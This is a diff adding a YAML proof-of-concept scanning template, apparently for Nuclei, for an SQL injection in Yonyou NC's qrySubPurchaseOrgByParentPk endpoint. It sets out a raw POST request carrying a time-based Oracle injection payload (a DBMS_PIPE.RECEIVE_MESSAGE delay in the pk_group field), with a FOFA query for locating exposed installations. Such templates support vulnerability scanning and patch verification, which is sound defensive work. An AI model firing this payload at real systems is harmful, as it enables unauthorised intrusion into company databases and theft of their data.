@@ -1,0 +1,26 @@
+id: poc-pkeigylo7lawccgz
+info:
+  name: 用友NC qrySubPurchaseOrgByParentPk 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pkeigylo7lawccgz'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pkeigylo7lawccgz
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    pk_group=1'' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(''RDS'',5) --'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
